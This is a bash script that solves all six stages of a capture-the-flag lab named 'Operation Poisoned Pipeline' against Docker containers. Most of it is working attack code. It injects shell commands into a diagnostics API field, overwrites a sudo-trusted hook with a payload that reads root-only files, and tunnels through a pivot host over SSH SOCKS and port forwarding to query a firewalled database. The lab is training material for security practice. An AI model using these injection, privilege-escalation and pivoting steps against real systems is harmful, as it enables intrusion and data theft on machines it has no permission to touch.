#!/usr/bin/env bash
# Operation Poisoned Pipeline - Solve All Six Stages
# Runs each solver with the correct invocation method.
# Prerequisites: pp-kali and all other containers must be running.

set -u

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${ROOT_DIR}"

# ─────────────────────────────────────────────────────────────
# Load private values (flags, credentials, pivot password, DB password)
# ─────────────────────────────────────────────────────────────
source private/s01/s01.env
source private/s02/s02.env
source private/s03/answer-manifest.env
source private/s04/s04.env
source private/s05/s05.env
source private/s06/s06.env

echo
echo "=============================================================="
echo " Operation Poisoned Pipeline — Solve All Six Stages"
echo "=============================================================="
echo

# ─────────────────────────────────────────────────────────────
# S01 — The Git Leak
# ─────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────────────────────"
echo " S01 — The Git Leak"
echo "─────────────────────────────────────────────────────────"
docker exec -it pp-kali bash /challenges/s01-git-leak/solver/s01-solver.sh
echo

# ─────────────────────────────────────────────────────────────
# S02 — Pipeline Breach  (needs env vars)
# ─────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────────────────────"
echo " S02 — Pipeline Breach"
echo "─────────────────────────────────────────────────────────"
docker exec -it \
    -e JENKINS_USER="${S01_JENKINS_USER}" \
    -e JENKINS_PASS="${S01_JENKINS_PASSWORD}" \
    -e JOB_NAME="${S01_JOB_NAME}" \
    pp-kali bash /challenges/s02-pipeline-breach/solver/s02-solver.sh
echo

# ─────────────────────────────────────────────────────────────
# S03 — Ghost Dependency  (takes evidence ZIP as arg)
# ─────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────────────────────"
echo " S03 — Ghost Dependency"
echo "─────────────────────────────────────────────────────────"
docker exec -it pp-kali bash /challenges/s03-ghost-dependency/solver/s03-solver.sh \
    /tmp/s02-solve/evidence-s03.zip
echo

# ─────────────────────────────────────────────────────────────
# S04 — Poisoned Runtime  (needs --read-flag)
# ─────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────────────────────"
echo " S04 — Poisoned Runtime"
echo "─────────────────────────────────────────────────────────"
docker exec -it pp-kali python3 \
    /challenges/s04-poisoned-runtime/solver/s04-solver.py --read-flag
echo

# ─────────────────────────────────────────────────────────────
# S05 — Broken Trust  (runs through the S04 RCE endpoint)
# The s05-solver.sh is a reference and is NOT runnable from Kali.
# We perform the intended escalation using three HTTP calls.
# ─────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────────────────────"
echo " S05 — Broken Trust (via S04 RCE endpoint)"
echo "─────────────────────────────────────────────────────────"

# 1) Confirm the sudo policy
echo "[1] Sudo policy:"
docker exec pp-kali curl -sS -X POST \
    -H 'Content-Type: application/json' \
    -d '{"component":"nexora-utils; sudo -n -l 2>&1"}' \
    http://nexora-app:5000/api/diagnostics/run | jq -r '.stdout' || true
echo

# 2) Overwrite the hook with a root payload
echo "[2] Overwriting trusted hook with escalation payload..."
PAYLOAD='{"component":"nexora-utils; printf \"#!/bin/bash\\nid\\ncat /root/s05_flag.txt\\ncat /root/s06_pivot.txt\\n\" > /opt/nexora/hooks/verify.sh; chmod 0755 /opt/nexora/hooks/verify.sh"}'
docker exec pp-kali curl -sS -X POST \
    -H 'Content-Type: application/json' \
    -d "${PAYLOAD}" \
    http://nexora-app:5000/api/diagnostics/run >/dev/null
echo

# 3) Trigger the privileged utility
echo "[3] Running sudo /usr/local/bin/deploy-verify as pipeline-app..."
docker exec pp-kali curl -sS -X POST \
    -H 'Content-Type: application/json' \
    -d '{"component":"nexora-utils; sudo -n /usr/local/bin/deploy-verify 2>&1"}' \
    http://nexora-app:5000/api/diagnostics/run | jq -r '.stdout' || true
echo

# 4) Restore the benign hook
echo "[4] Restoring benign hook..."
RESTORE='{"component":"nexora-utils; printf \"#!/bin/bash\\nset -eu\\necho \\\"[verify] validation passed\\\"\\nexit 0\\n\" > /opt/nexora/hooks/verify.sh; chmod 0775 /opt/nexora/hooks/verify.sh"}'
docker exec pp-kali curl -sS -X POST \
    -H 'Content-Type: application/json' \
    -d "${RESTORE}" \
    http://nexora-app:5000/api/diagnostics/run >/dev/null
echo "    Done."
echo

# ─────────────────────────────────────────────────────────────
# S06 — Behind the Firewall  (SSH tunnel + psql via Kali)
# ─────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────────────────────"
echo " S06 — Behind the Firewall"
echo "─────────────────────────────────────────────────────────"

# Pass the pivot and DB passwords into Kali via environment and
# run the tunnel + query inside one shell.
docker exec -it \
    -e PIVOT_USER="pivot" \
    -e PIVOT_PASS="${S06_PIVOT_PASSWORD}" \
    -e PIVOT_HOST="nexora-app" \
    -e PIVOT_PORT="22" \
    -e DB_USER="${DB_READER_USER}" \
    -e DB_PASS="${DB_READER_PASSWORD}" \
    -e DB_HOST="10.13.20.10" \
    -e DB_PORT="5432" \
    -e DB_NAME="${POSTGRES_DB}" \
    pp-kali bash -c '
        set -u
        echo "[1] Confirming direct access to PostgreSQL is blocked..."
        if nc -z -w 3 "${DB_HOST}" "${DB_PORT}" 2>/dev/null; then
            echo "    REACHABLE (unexpected)"
            exit 1
        else
            echo "    BLOCKED as expected"
        fi

        echo
        echo "[2] Establishing SSH SOCKS tunnel through ${PIVOT_HOST}..."

        ASKPASS="$(mktemp)"
        printf "#!/bin/sh\necho \"%s\"\n" "${PIVOT_PASS}" > "${ASKPASS}"
        chmod 0700 "${ASKPASS}"

        SSH_ASKPASS="${ASKPASS}" SSH_ASKPASS_REQUIRE=force setsid -w ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o NumberOfPasswordPrompts=1 \
            -o ExitOnForwardFailure=yes \
            -f -N -D 127.0.0.1:1080 \
            -p "${PIVOT_PORT}" \
            "${PIVOT_USER}@${PIVOT_HOST}" 2>/dev/null

        if ss -lnt | grep -q ":1080 "; then
            echo "    SOCKS proxy listening on 127.0.0.1:1080"
        else
            echo "    FAILED: SOCKS proxy not listening"
            exit 1
        fi

        echo
        echo "[3] Writing proxychains config..."
        cat > /tmp/proxychains-s06.conf <<PC_EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
PC_EOF

        echo
        echo "[4] Proxied scan for PostgreSQL 5432..."
        proxychains4 -q -f /tmp/proxychains-s06.conf nc -z -w 5 "${DB_HOST}" "${DB_PORT}" \
            && echo "    PostgreSQL 5432 OPEN through tunnel" \
            || echo "    PostgreSQL 5432 CLOSED (unexpected)"

        echo
        echo "[5] Starting local port-forward for psql..."
        CTL_SOCK="/tmp/s06.sock"
        ASKPASS2="$(mktemp)"
        printf "#!/bin/sh\necho \"%s\"\n" "${PIVOT_PASS}" > "${ASKPASS2}"
        chmod 0700 "${ASKPASS2}"

        SSH_ASKPASS="${ASKPASS2}" SSH_ASKPASS_REQUIRE=force setsid -w ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o NumberOfPasswordPrompts=1 \
            -o ExitOnForwardFailure=yes \
            -M -S "${CTL_SOCK}" \
            -f -N \
            -L "127.0.0.1:15432:${DB_HOST}:${DB_PORT}" \
            -p "${PIVOT_PORT}" \
            "${PIVOT_USER}@${PIVOT_HOST}" 2>/dev/null

        if ss -lnt | grep -q ":15432 "; then
            echo "    Local forward listening on 127.0.0.1:15432"
        else
            echo "    FAILED: local forward not listening"
            exit 1
        fi

        echo
        echo "[6] Querying ctf_final through the tunnel..."
        PGPASSWORD="${DB_PASS}" psql \
            -h 127.0.0.1 -p 15432 \
            -U "${DB_USER}" -d "${DB_NAME}" -tA \
            -c "SELECT record_value FROM ctf_final WHERE record_key='"'"'s06_final_record'"'"';"

        echo
        echo "[7] Cleaning up..."
        ssh -S "${CTL_SOCK}" -O exit "${PIVOT_USER}@${PIVOT_HOST}" 2>/dev/null || true
        pkill -f "ssh.*127.0.0.1:1080" 2>/dev/null || true
        rm -f "${ASKPASS}" "${ASKPASS2}" "${CTL_SOCK}" /tmp/proxychains-s06.conf
        echo "    Done."
    '
echo

echo "=============================================================="
echo " All six stages solved."
echo " Submit each flag to https://10.13.10.20/challenges"
echo "=============================================================="
